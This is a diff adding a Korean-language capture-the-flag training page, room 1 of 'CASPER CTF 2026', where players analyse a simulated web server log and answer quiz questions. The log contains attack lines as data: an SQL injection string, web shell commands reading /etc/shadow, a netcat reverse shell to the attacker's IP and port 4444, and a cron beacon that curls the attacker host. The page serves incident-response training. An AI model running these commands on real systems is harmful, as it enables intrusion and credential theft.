@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>방 1 - 침해 로그 분석 | CASPER CTF 2026</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">🔐 CASPER CTF</div>
+            <div class="timer" id="timer">00:00</div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="progress-container">
+            <div class="progress-header">
+                <span class="progress-text" id="progress-text">방 1/7</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill" style="width: 14.28%;"></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🔍 방 1 — 침해 로그 분석</h2>
+            <p style="color: #aaa; margin-bottom: 20px;">
+                SIEM 대시보드에서 이상 징후가 감지되었습니다. 웹서버 액세스 로그를 분석하여 공격을 파악하세요.
+            </p>
+
+            <h3>📊 웹서버 액세스 로그</h3>
+            <div class="log-container" id="log-display">
+                <div class="log-line">[2026-02-10 03:14:22] 192.168.1.105 GET /index.html 200</div>
+                <div class="log-line">[2026-02-10 03:14:23] 192.168.1.105 GET /style.css 200</div>
+                <div class="log-line">[2026-02-10 03:14:24] 192.168.1.106 GET /api/users 200</div>
+                <div class="log-line suspicious">[2026-02-10 03:14:25] 10.0.14.33    GET /admin 403</div>
+                <div class="log-line suspicious">[2026-02-10 03:14:25] 10.0.14.33    GET /admin' OR '1'='1 200</div>
+                <div class="log-line">[2026-02-10 03:14:25] 192.168.1.107 GET /products 200</div>
+                <div class="log-line suspicious">[2026-02-10 03:14:26] 10.0.14.33    POST /admin/upload.php 200</div>
+                <div class="log-line">[2026-02-10 03:14:26] 192.168.1.105 GET /about.html 200</div>
+                <div class="log-line suspicious">[2026-02-10 03:14:27] 10.0.14.33    GET /uploads/sh3ll.php?cmd=whoami 200</div>
+                <div class="log-line suspicious">[2026-02-10 03:14:28] 10.0.14.33    GET /uploads/sh3ll.php?cmd=cat+/etc/shadow 200</div>
+                <div class="log-line">[2026-02-10 03:14:29] 192.168.1.108 POST /api/login 200</div>
+                <div class="log-line suspicious">[2026-02-10 03:14:30] 10.0.14.33    GET /uploads/sh3ll.php?cmd=nc+-e+/bin/bash+10.0.14.33+4444 200</div>
+                <div class="log-line">[2026-02-10 03:14:32] 192.168.1.105 GET /contact.html 200</div>
+                <div class="log-line suspicious">[2026-02-10 03:14:35] 10.0.14.33    GET /uploads/sh3ll.php?cmd=crontab+-l 200</div>
+                <div class="log-line">[2026-02-10 03:14:37] 192.168.1.109 GET /blog 200</div>
+                <div class="log-line suspicious">[2026-02-10 03:14:40] 10.0.14.33    GET /uploads/sh3ll.php?cmd=echo+'*/5+*+*+*+*+curl+http://10.0.14.33/beacon'>>cron.txt 200</div>
+                <div class="log-line">[2026-02-10 03:14:42] 192.168.1.105 GET /logout 200</div>
+                <div class="log-line">[2026-02-10 03:14:45] 192.168.1.110 GET /search?q=security 200</div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>❓ 질문에 답하세요 (5개 모두 정답이어야 통과)</h3>
+            
+            <div class="question">
+                <label>1. 공격자의 IP 주소는?</label>
+                <input type="text" id="q1" placeholder="예: 10.0.14.33">
+            </div>
+
+            <div class="question">
+                <label>2. 최초 공격 기법은?</label>
+                <select id="q2">
+                    <option value="">선택하세요</option>
+                    <option value="XSS">XSS</option>
+                    <option value="SQL Injection">SQL Injection</option>
+                    <option value="CSRF">CSRF</option>
+                    <option value="RCE">RCE</option>
+                </select>
+            </div>
+
+            <div class="question">
+                <label>3. 업로드된 웹셸 파일명은?</label>
+                <input type="text" id="q3" placeholder="예: shell.php">
+            </div>
+
+            <div class="question">
+                <label>4. 공격자가 리버스 셸에 사용한 포트 번호는?</label>
+                <input type="text" id="q4" placeholder="예: 4444">
+            </div>
+
+            <div class="question">
+                <label>5. 공격자가 설정한 지속성 유지(Persistence) 방법은?</label>
+                <select id="q5">
+                    <option value="">선택하세요</option>
+                    <option value="레지스트리">레지스트리</option>
+                    <option value="Crontab">Crontab</option>
+                    <option value="Systemd">Systemd</option>
+                    <option value="SSH 키">SSH 키</option>
+                </select>
+            </div>
+
+            <div class="feedback hidden" id="feedback"></div>
+
+            <div class="text-center mt-20">
+                <button id="submit-btn" class="btn">제출</button>
+            </div>
+        </div>
+
+        <div class="card hint-section">
+            <h3>💡 힌트</h3>
+            <button class="hint-btn btn-secondary">힌트 1 보기 (+2분)</button>
+            <div class="hint-text hidden" id="hint-1">
+                <strong>힌트:</strong> 빨간색으로 표시된 의심스러운 로그를 집중적으로 분석하세요. 
+                SQL Injection은 ' OR '1'='1 패턴을 사용하며, 웹셸 업로드 후 ?cmd= 파라미터로 명령을 실행합니다.
+            </div>
+            <button class="hint-btn btn-secondary">힌트 2 보기 (+2분)</button>
+            <div class="hint-text hidden" id="hint-2">
+                <strong>힌트:</strong> nc 명령어는 netcat으로 리버스 셸 연결에 사용됩니다. 
+                포트는 명령어 맨 뒤에 있으며, crontab은 Linux의 작업 스케줄러입니다.
+            </div>
+        </div>
+    </div>
+
+    <script src="js/common.js"></script>
+    <script src="js/room1.js"></script>
+</body>
+</html>
